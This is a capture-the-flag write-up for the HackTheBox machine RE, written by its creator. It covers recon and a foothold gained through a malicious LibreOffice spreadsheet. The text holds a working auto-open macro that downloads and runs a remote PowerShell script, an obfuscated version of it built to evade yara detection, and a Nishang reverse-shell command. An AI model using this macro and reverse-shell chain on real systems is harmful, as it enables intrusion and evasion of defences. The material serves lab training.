---
title: HTB: RE
url: https://0xdf.gitlab.io/2020/02/01/htb-re.html
date: 2020-02-01T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, ctf, htb-re, nmap, vhosts, jekyll, smbclient, smbmap, libreoffice, office, ods, macro, invoke-obfuscation, nishang, zipslip, winrar, cron, webshell, ghidra, xxe, responder, hashcat, evil-winrm, winrm, chisel, tunnel, usosvc, accesschk, service, service-hijack, diaghub, esf, mimikatz, hashes-org, htb-ai, htb-hackback, htb-helpline
---

![RE](https://0xdfimages.gitlab.io/img/re-cover.png)

RE was a box I was really excited about, and I was crushed when the final privesc didn’t work on initial deployment. Still, it got patched, and two unintended paths came about as well, and everything turned out ok. I’ll approach this write-up how I expected people to solve it, and call out the alternative paths (and what mistakes on my part allowed them) as well. I’ll upload a malicious ods file to a malware sandbox where it is run as long as it is obfuscated. From there, I’ll abuse WinRar slip vulnerability to write a webshell. Now as IIS user, I can access a new folder where Ghidra project files can be dropped to exploit an XXE in Ghidra. There’s two unintended paths from IIS to SYSTEM using the UsoSvc and Zipslip and Diaghub, where then I have to get coby’s creds to read root.txt. I’ll show all of these, and look at some of the automation scripts (including what didn’t work on initial deployment) in Beyond Root.

## Box Info

| Name | [RE](https://hackthebox.com/machines/re)  [RE](https://hackthebox.com/machines/re) [Play on HackTheBox](https://hackthebox.com/machines/re) |
| --- | --- |
| Release Date | [20 Jul 2019](https://twitter.com/hackthebox_eu/status/1151417190119333888) |
| Retire Date | 01 Feb 2020 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for RE |
| Radar Graph | Radar chart for RE |
| First Blood User | 00:59:22[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 05:25:02[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [0xdf 0xdf](https://app.hackthebox.com/users/4935) |

## Author’s Perspective

This was the second box I created for HTB, and it was one that I was really excited about. The idea is that it’s a machine belonging to a malware reverse engineer, a technical user, which gives a reason for the box to accept and run a specific type of document. I liked the idea of having a website that was there only for flavor and context, but not vulnerable, and since I’ve got some experience using the static site generator Jekyll to host a blog, that was a good fit.

Setting up the malware sandbox was one of two areas where my plan for this box took a lot of twists and turns. I really wanted to have the malware running in a container. In a few early attempts to create this box, I had Docker running a Windows container, but had a hard time getting LibreOffice to work properly and run the macros in that environment. I thought it would be really neat to have Docker running on a Windows host, but wasn’t able to make it work for this box.

When I was creating this box, Ghidra had just been released by the NSA, and there was a (in my opinion way overhyped) media storm about a [“backdoor” in the software](https://twitter.com/hackerfantastic/status/1103087869063704576?lang=en) where it exposed the Java debug port if you ran it in debug mode. My original intention was to include that exploit as the initial access vector, but there was a problem - only one user can connect to JWDB at a time. Furthermore, Ghidra makes it really difficult to run multiple instances at once. I played with ways to containerize it, or run multiple instances, or even make it the last step, but it just didn’t seem great. I see the same idea (JWDB) did make it as privesc for [AI](/2020/01/25/htb-ai.html#priv-alexa--root). Then I saw the issue on GitHub about XXE, and decided that was the way to go.

The WinRar ACE vulnerability was also really big in the news at the time. Several strains of ransomware were phishing with `.rar` payloads that would set their malware to run on next boot. It was a bit of a challenge, since I couldn’t actually use WinRar on the box due to it’s licensing terms. It turns out the bug wasn’t actually in WinRar, it was in a dll that was used only for this old and obsecure archive format, ACE. I was able to get that vulnerable dll and find PeaZip which will use the same dll. And then I just tried to make the scripts look like WinRar had recently been removed, but that the receiving pipeline expected rar files.

Like most boxes, I missed something. I must have gone back to a clean OS install at least five times at while making this box, trying different OS versions and different ways to get Docker installed. I spent a lot of time patching Windows to get up to full patch level. Except, it seems, the last time, where I must not have patched at all. That leads to two unintended paths from IIS to SYSTEM. I’ll show those [later in the post](#unintended-paths-via-system).

Those unintended paths also turned out to be fortunate, as the intended Privesc from IIS to coby, despite working locally, didn’t work on initial deployment to HTB. I’ll go into why, and how we fixed it in [Beyond Root](#automating-ghidra).

## Recon

### nmap

`nmap` shows two open ports, HTTP (TCP 80) and SMB (TCP 445):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.144
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 16:16 EST
Nmap scan report for 10.10.10.144
Host is up (0.27s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
root@kali# nmap -p 80,445 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.144
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 16:18 EST
Nmap scan report for 10.10.10.144
Host is up (0.014s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-26T21:18:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.73 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), this looks like Windows 10 (or Server 2016 or 2019).

### HTTP - TCP 80

#### reblog.htb

Visiting `http://10.10.10.144/` returns a redirect to reblog.htb. Since I have Firefox configured to prompt before folloring redirects, I can see it with the message body here:

![image-20191126162214171](https://0xdfimages.gitlab.io/img/image-20191126162214171.png)

I’ll update my `/etc/hosts` file to map reblog.htb to 10.10.10.144, and then allow the redirect. I get a page titled “RE Blog”.

![1553711547170](https://0xdfimages.gitlab.io/img/1553711547170.png)

In the source, I see references to Jekyll, which is a static site generator. That suggests it’s likely not exploitable. Still ,there are several articles here of interest, and the following pieces of information are noteworthy:
- The first article contains hints that there are scripts running on the box and to look for user interaction to move between users.
- The second introduces Ghidra, something that I will exploit later.
- The third references the JDWP Ghidra exploit that was quite famous. This is a red herring, as the Ghidra on this box isn’t running in debug mode. The article even says that no one should run in debug mode.
- The fourth article is a reference to a blog post about using yara to examine macros in Libre Office. It hints that Libre Office is at use here. It also shows how the box’s owner is using yara to filter out uninteresting documents.
- The fifth article talks about how the organization may be blind to techniques in the DOSfuscation and Invoke-Obfuscation research.
- The sixth article is most important for the initial foothold:

  > The SOC has been seeing lots of phishing attempts with ods attachments lately. It seems that we’ve got rules in place to detect any run of the mill stuff, including documents that are generated by Metasploit, documents with powershell or cmd invocations.
  >
  > If you see any interesting documents that might get past our yara rules, please drop them in the malware dropbox. I’ve got some automated processing that will see if our rules already identify it, and if not, run it to collect some log data and queue it for further analysis.

  `.ods` files are the Open Office equivalent of `.xls` spreadsheet files. They also have a macro / scripting capability, just like Microsoft Office.

#### re.htb

Given that virtual hosts are in play, I might as well check for others. `re.htb` is an obvious one to look at (though if I had not checked here, I could see the three different sites once I have a shell).

On visiting `http://re.htb`, it just says “Please check back soon for re.htb updates.”. The page title is “Ghidra Dropbox Coming Soon!”, which is interesting. In the page source, commented out, is instructions for how to upload a Ghidra project once that’s implemented:

```

<!DOCTYPE html>
<html>
  <head>
    <title>Ghidra Dropbox Coming Soon!</title>
  </head>
  <body>
    <p>Please check back soon for re.htb updates.</p>
	<!--future capability
	<p> To upload Ghidra project:
	<ol>
	  <li> exe should be at project root.Directory structure should look something like:
	      <code><pre>
|   vulnerserver.gpr
|   vulnserver.exe
\---vulnerserver.rep
    |   project.prp
    |   projectState
    |
    +---idata
    |   |   ~index.bak
    |   |   ~index.dat
    |   |
    |   \---00
    |       |   00000000.prp
    |       |
    |       \---~00000000.db
    |               db.2.gbf
    |               db.3.gbf
    |
    +---user
    |       ~index.dat
    |
    \---versioned
            ~index.bak
            ~index.dat
		  </pre></code>
	  </li>
	  <li>Add entire directory into zip archive.</li>
	  <li> Upload zip here:</li>
    </ol> -->
</body>
 </html>

```

I’ll keep that in the back of my mind for later.

### SMB - TCP 445

`smbmap` doesn’t return anything, but `smbclient` will list a single share:

```

root@kali# smbmap -H 10.10.10.144
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.144
[!] Authentication error on 10.10.10.144

root@kali# smbclient -N -L //10.10.10.144

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        malware_dropbox Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.144 failed (Error NT_STATUS_IO_TIMEOUT)
Failed to connect with SMB1 -- no workgroup available

```

The share is the malware\_dropbox referenced in the post.

If I run `smbmap` with a bad username (I typically just use 0xdf, but since I wrote this box, I’ll use something not likely to be real), it returns two read only shares (`malware_dropbox` and `$IPC`) as well as a bunch of named pipes:

```

root@kali# smbmap -H 10.10.10.144 -u notarealuser
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.144...
[+] IP: 10.10.10.144:445        Name: re.htb                                            
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        .                                                  
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                8 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-32c-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1c0-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3e4-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--               15 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3a8-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-6d4-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    winreg
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                6 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-248-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132236481158524467.1708.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132236481158521383.1692.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132236481158523203.1700.DefaultAppDomain.powershell
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    efsrpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        IPC$                                                    READ ONLY       Remote IPC
        .                                                  
        dr--r--r--                0 Tue Jun 18 17:08:36 2019    .
        dr--r--r--                0 Tue Jun 18 17:08:36 2019    ..
        malware_dropbox                                         READ ONLY

```

For some reason it is reporting READ ONLY, but that’s not true (as I’ll show in a minute). IppSec debugs this in [his video for RE](https://youtu.be/YXAakamjO_I?t=510).

## Shell as luke

### Prepare Document

The blog post said it wanted to sandbox `.ods` files that weren’t made by Metasploit or standard PowerShell. I’ll make one.

#### Create Document

Now I’ll create a new LibreOffice `.ods` file, which is a spreadsheet, similar to Excel. I’ll open Calc, and go to Tools –> Macros –> Organize Macros –> LibreOffice Basic:

[![Create Macro](https://0xdfimages.gitlab.io/img/image-20191126164802663.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20191126164802663.png)

In the dialog box that pops up, I’ll select the document I’m working in on the left side (Untitled 1) and click “New”. I’ll give the module a name (“evil”), and click Ok to be taken to the macro editor:

![image-20191126165016795](https://0xdfimages.gitlab.io/img/image-20191126165016795.png)

OpenOffice macros use Basic, a similar but [slightly different](https://wiki.openoffice.org/wiki/Documentation/FAQ/Macros/Can_I_use_my_Microsoft_Office_macros%3F) language to the VBA that’s in MS macros. To run a command on a Windows host from LibreOffice Basic, I’ll need to put it into `Shell()` as a string. So I wrap my command in `""`. To nest quotes, I’ll use two double quotes (`""`). I’ll call `Shell` to execute some simple download and execute code:

```

REM  *****  BASIC  *****

Sub Main

    Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')""")
    
End Sub

```

#### AutoOpen

Now I need to make sure this macro is run when the document is opened. I’ll close the macro editors, and back in the document, go to Tools –> Customize and the window that pops up for me is already in the Events tab:

![image-20191126165604284](https://0xdfimages.gitlab.io/img/image-20191126165604284.png)

I’ll select “Open Document” and click on the “Macro…” button. I’ll navigte to select my macro:

![image-20191126165650380](https://0xdfimages.gitlab.io/img/image-20191126165650380.png)

When I hit “OK”, I see it now in the list:

![image-20191126165705659](https://0xdfimages.gitlab.io/img/image-20191126165705659.png)

I’ll save my sheet as `shell.ods`, and exit LibreOffice.

### Upload and Nothing

My document is going to run PowerShell that will get over HTTP from me and `Invoke-Expression` what I return. I’ll grab a copy of `Invoke-PowerShellTcp.ps1` from [Nishang](https://github.com/samratashok/nishang), and add a line to the end that executes a reverse shell back to me:

```

root@kali# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
root@kali# echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1 

```

Now I’ll upload my `.ods` to the dropbox:

```

root@kali# smbclient -N //10.10.10.144/malware_dropbox
Try "help" to get a list of possible commands.
smb: \> put shell.ods 
putting file shell.ods as \shell.ods (1054.2 kb/s) (average 1658.9 kb/s)

```

If I run `ls` over the `smb: \>`, I can see the document there, and a few seconds later, it’s gone. But no shell.

#### Obfuscation

It’s clear from the notes on the blog that I need to drop an ods file into the dropbox, but also that the code I run can’t be something unobfuscated or basic output of meterpreter. That’s probably why the previous document didn’t work. I could obfuscate this by hand by breaking up strings. I can guess this will work, since there’s hints about RE using Yara for string matching.

But there are also hints about using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), and that’s more fun to play with. `Invoke-Obfuscation` is already on my Commando VM.

Now I’ll open PowerShell, source it, and then run it:

```

PS C:\Users\0xdf > Import-Module C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS C:\Users\0xdf > Invoke-Obfuscation

IEX( ( '36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]$_ -AS [Char]) } ) -Join'' )
  |    |    |    |
  |    |    |    |
 \ /  \ /  \ /  \ /
  V    V    V    V
$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
  |    |    |
  |    |    |
 \ /  \ /  \ /
  V    V    V
.("wRIt" +  "e-H" + "Ost") (  "I" +"nvoke"+"-Obfus"+"cat"  +  "io" +"n") -ForegroundColor ( 'Gre'+'en')
  |    |
  |    |
 \ /  \ /
  V    V
Write-Host "Invoke-Obfuscation" -ForegroundColor Green
  |
  |
 \ /
  V
Invoke-Obfuscation

            ____                 __
           /  _/___ _   ______  / /_____
           / // __ \ | / / __ \/ //_/ _ \______
         _/ // / / / |/ / /_/ / ,< /  __/_____/
        /______ /__|_________/_/|_|\___/         __  _
          / __ \/ /_  / __/_  ________________ _/ /_(_)___  ____
         / / / / __ \/ /_/ / / / ___/ ___/ __ `/ __/ / __ \/ __ \
        / /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /
        \____/_.___/_/  \__,_/____/\___/\__,_/\__/_/\____/_/ /_/

        Tool    :: Invoke-Obfuscation
        Author  :: Daniel Bohannon (DBO)
        Twitter :: @danielhbohannon
        Blog    :: http://danielbohannon.com
        Github  :: https://github.com/danielbohannon/Invoke-Obfuscation
        Version :: 1.8
        License :: Apache License, Version 2.0
        Notes   :: If(!$Caffeinated) {Exit}

HELP MENU :: Available options shown below:

[*]  Tutorial of how to use this tool             TUTORIAL
[*]  Show this Help Menu                          HELP,GET-HELP,?,-?,/?,MENU
[*]  Show options for payload to obfuscate        SHOW OPTIONS,SHOW,OPTIONS
[*]  Clear screen                                 CLEAR,CLEAR-HOST,CLS
[*]  Execute ObfuscatedCommand locally            EXEC,EXECUTE,TEST,RUN
[*]  Copy ObfuscatedCommand to clipboard          COPY,CLIP,CLIPBOARD
[*]  Write ObfuscatedCommand Out to disk          OUT
[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
[*]  Go Back to previous obfuscation menu         BACK,CD ..
[*]  Quit Invoke-Obfuscation                      QUIT,EXIT
[*]  Return to Home Menu                          HOME,MAIN

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)

Invoke-Obfuscation>

```

For anyone who hasn’t run this before, the `TUTORIAL` command will print additional help:

```

Invoke-Obfuscation> Tutorial

TUTORIAL :: Here is a quick tutorial showing you how to get your obfuscation on:

1) Load a scriptblock (SET SCRIPTBLOCK) or a script path/URL (SET SCRIPTPATH).
   SET SCRIPTBLOCK Write-Host 'This is my test command' -ForegroundColor Green

2) Navigate through the obfuscation menus where the options are in YELLOW.
   GREEN options apply obfuscation.
   Enter BACK/CD .. to go to previous menu and HOME/MAIN to go to home menu.
   E.g. Enter ENCODING & then 5 to apply SecureString obfuscation.

3) Enter TEST/EXEC to test the obfuscated command locally.
   Enter SHOW to see the currently obfuscated command.

4) Enter COPY/CLIP to copy obfuscated command out to your clipboard.
   Enter OUT to write obfuscated command out to disk.

5) Enter RESET to remove all obfuscation and start over.
   Enter UNDO to undo last obfuscation.
   Enter HELP/? for help menu.

And finally the obligatory "Don't use this for evil, please" :)

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)

Invoke-Obfuscation>

```

I’ll set the `SCRIPTBLOCK` to the command I want to run:

```

Invoke-Obfuscation> SET SCRIPTBLOCK iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')

Successfully set ScriptBlock:
iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')

```

Now I can select different ways to obfuscate. For example, if I start with `TOKEN`, it takes me to a sub menu:

```

Invoke-Obfuscation> TOKEN

Choose one of the below Token options:

[*] TOKEN\STRING        Obfuscate String tokens (suggested to run first)
[*] TOKEN\COMMAND       Obfuscate Command tokens
[*] TOKEN\ARGUMENT      Obfuscate Argument tokens
[*] TOKEN\MEMBER        Obfuscate Member tokens
[*] TOKEN\VARIABLE      Obfuscate Variable tokens
[*] TOKEN\TYPE          Obfuscate Type tokens
[*] TOKEN\COMMENT       Remove all Comment tokens
[*] TOKEN\WHITESPACE    Insert random Whitespace (suggested to run last)
[*] TOKEN\ALL           Select All choices from above (random order)

```

It recommends string first, so I’ll do that:

```

Invoke-Obfuscation\Token> string

Choose one of the below Token\String options to APPLY to current payload:

[*] TOKEN\STRING\1      Concatenate --> e.g. ('co'+'ffe'+'e')
[*] TOKEN\STRING\2      Reorder     --> e.g. ('{1}{0}'-f'ffee','co')

```

When I enter `1`, I can see my `SCRIPTBLOCK` has changed:

```

Invoke-Obfuscation\Token\String> 1

[*] Obfuscating 1 String token.

Executed:
  CLI:  Token\String\1
  FULL: Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'String' 1

Result:
iex(new-object net.webclient).downloadstring(('ht'+'tp://1'+'0'+'.10.1'+'4.'+'1'+'9/shell.'+'ps1'))

Choose one of the below Token\String options to APPLY to current payload:

[*] TOKEN\STRING\1      Concatenate --> e.g. ('co'+'ffe'+'e')
[*] TOKEN\STRING\2      Reorder     --> e.g. ('{1}{0}'-f'ffee','co')

```

I’ll then run `2` for good measure:

```

Invoke-Obfuscation\Token\String> 2

[*] Obfuscating 8 String tokens.

Executed:
  CLI:  Token\String\2
  FULL: Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'String' 2

Result:
iex(new-object net.webclient).downloadstring(('ht'+("{2}{0}{1}"-f'p:','//1','t')+'0'+("{0}{1}" -f'.10','.1')+'4.'+'1'+("{1}{2}{0}"-f 'l.','9/she','l')+'ps1'))

```

After playing around for a few minutes, I’ll end up with the following command:

```

cmd  /cpowErSHElL  ".('{0}{1}' -f 'ie','x')(&('{0}{1}{2}' -f 'new-o','b','ject') ('net.webc'+'l'+'i'+'ent')).('download'+'s'+'trin'+'g').Invoke(('ht'+'tp:/'+'/10'+'.'+'10.14.'+'19/shel'+'l.ps1'))"

```

#### Macro

I’ll make a copy of my previous document and update the macro to match what came out of `Invoke-Obfuscation`, fixing the `"` to account for nesting:

```

REM  *****  BASIC  *****

Sub Main

	Shell("cmd  /cpowErSHElL  "".('{0}{1}' -f 'ie','x')(&('{0}{1}{2}' -f 'new-o','b','ject') ('net.webc'+'l'+'i'+'ent')).('download'+'s'+'trin'+'g').Invoke(('ht'+'tp:/'+'/10'+'.'+'10.14.'+'19/shel'+'l.ps1'))""")

End Sub

```

### Upload and Shell

I’ve already got `shell.ps1` waiting in my local host and a Python webserver running. Now I’ll upload my `.ods` with obfuscated macro to the dropbox:

```

root@kali# smbclient -N //10.10.10.144/malware_dropbox
Try "help" to get a list of possible commands.
smb: \> put shell-obf.ods 
putting file shell-obf.ods as \shell-obf.ods (1054.2 kb/s) (average 1658.9 kb/s)

```

A few seconds later, I see a hit on the webserver:

```
10.10.10.144 - - [27/Mar/2019 15:18:48] "GET /shell.ps1 HTTP/1.1" 200 -

```

Followed by a shell on `nc` as luke (with `rlwrap` on the `nc` to get up and down arrows in the shell):

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.144.
Ncat: Connection from 10.10.10.144:49675.
Windows PowerShell running as user luke on RE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files\LibreOffice\program>whoami
re\luke

```

And I’ll find `user.txt` on the desktop:

```

PS C:\users\luke\desktop> type user.txt
FE41736F************************

```

## Shell as IIS

### Enumeration

Luke’s documents directory has some interesting stuff in it:

```

PS C:\users\luke\Documents> dir

    Directory: C:\users\luke\Documents

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/16/2020   4:01 AM                malware_dropbox                                                       
d-----        1/16/2020   4:01 AM                malware_process                                                       
d-----        1/16/2020   4:02 AM                ods                                                                   
-a----        6/18/2019  10:30 PM           1096 ods.yara                                                              
-a----        6/18/2019  10:33 PM           1783 process_samples.ps1                                                   
-a----        3/13/2019   6:47 PM        1485312 yara64.exe  

```

`process_samples.ps1` seems to be the code that’s handling the uploaded `.ods` files:

```

$process_dir = "C:\Users\luke\Documents\malware_process"
$files_to_analyze = "C:\Users\luke\Documents\ods"
$yara = "C:\Users\luke\Documents\yara64.exe"
$rule = "C:\Users\luke\Documents\ods.yara"

while($true) {
        # Get new samples
        move C:\Users\luke\Documents\malware_dropbox\* $process_dir

        # copy each ods to zip file
        Get-ChildItem $process_dir -Filter *.ods | 
        Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}

        Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {

                # unzip archive to get access to content
                $unzipdir = Join-Path $_.directory $_.Basename
                New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
                Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir

                # yara to look for known malware
                $yara_out = & $yara -r $rule $unzipdir
                $ods_name = $_.fullname -replace ".zip", ".ods"
                if ($yara_out.length -gt 0) {
                        Remove-Item $ods_name
                }
        }

        # if any ods files left, make sure they launch, and then archive:
        $files = ls $process_dir\*.ods
        if ( $files.length -gt 0) { 
                # launch ods files
                Invoke-Item "C:\Users\luke\Documents\malware_process\*.ods"
                Start-Sleep -s 5

                # kill open office, sleep
                Stop-Process -Name soffice*
                Start-Sleep -s 5

                #& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
                Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
                $hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
                # Upstream processing may expect rars. Rename to .rar
                Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
        }

        Remove-Item -Recurse -force -Path $process_dir\*
        Start-Sleep -s 5
}

```

It runs an infinite loop that:
1. Moves samples from the dropbox folder to the `malware_process` folder.
2. Creates a copy of each `.ods` with the extension `.zip` (since [these documents are just zip files](https://superuser.com/questions/1444909/why-are-ms-office-files-actually-zip-files-with-another-extension))
3. Unzips the copy.
4. Runs Yara with the rule file `ods.yara` against the unzipped directory, and deletes the items if there are any results.
5. If there’s still a file, it opens it with `Invoke-Item`, which will open it in LibreOffice.
6. Sleep for 5 seconds.
7. Kill `soffice` process.
8. Sleep for 5 seconds.
9. Compress the file and put it into the `$files_to_analyze` path.

I’ll see inside `process_samples.ps1` that the samples are run and then compressed and dropped into the `ods` directory. I’ll also notice that dir is empty.

If I drop a file in there, after a few seconds, it’s gone.

The section the creates the archive has comments:

```

#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
# Upstream processing may expect rars. Rename to .rar
Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar

```

It looks like the script used to use WinRar, but I’ll notice that’s not installed. Still, it says upstream processing will expect rar files. I guess it’s using WinRar (or at least is supposed to look like it is).

There was a well know vulnerability in how Winrar processed ACE files. [Checkpoint put out a good post describing the details](https://research.checkpoint.com/extracting-code-execution-from-winrar/). The basic idea is that an attacker can use `../` or `..\` to decompress files outside of the local directory, like ZipSlip. Most implementations seen in the wild try to get a binary into the startup folder to run on next reboot. That won’t work for HTB, as the box doesn’t really reboot. But I can drop a webshell.

I see there’s three folders in the `wwwroot` directory:

```

PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/26/2019   5:58 PM                blog
d-----        3/22/2019   8:54 AM                ip
d-----        3/26/2019   5:40 PM                re   

```

I can’t read any of them.

I’ll also see this folder in the root dir, `proj_drop`. Given the note about uploading projects on `re.htb`, I’ll upload a shell in re, and see if that user has access to `proj_drop`.

### Create Archive

